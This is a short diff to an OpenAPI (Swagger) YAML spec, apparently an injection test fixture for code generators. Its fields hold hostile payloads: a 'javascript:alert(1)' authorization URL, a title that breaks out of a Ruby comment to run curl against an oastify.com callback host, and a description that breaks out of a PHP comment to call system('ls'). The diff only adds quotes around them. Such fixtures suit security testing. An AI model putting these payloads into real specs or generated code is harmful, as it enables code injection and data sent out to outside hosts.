@@ -5,8 +5,8 @@ securityDefinitions:
     authorizationUrl: javascript:alert(1)//
 info:
   version: "0.0.1"
-  title: =end `curl -X POST -d \"fizz=buzz\" http://y43c6y5dfwfxxkmqxagvebl0krqiea2z.oastify.com`
-  description: */ echo system(chr(0x6c).chr(0x73)); /*
+  title: "=end `curl -X POST -d \"fizz=buzz\" http://y43c6y5dfwfxxkmqxagvebl0krqiea2z.oastify.com`"
+  description: "*/ echo system(chr(0x6c).chr(0x73)); /*"
 paths:
   /accounts:
     get:
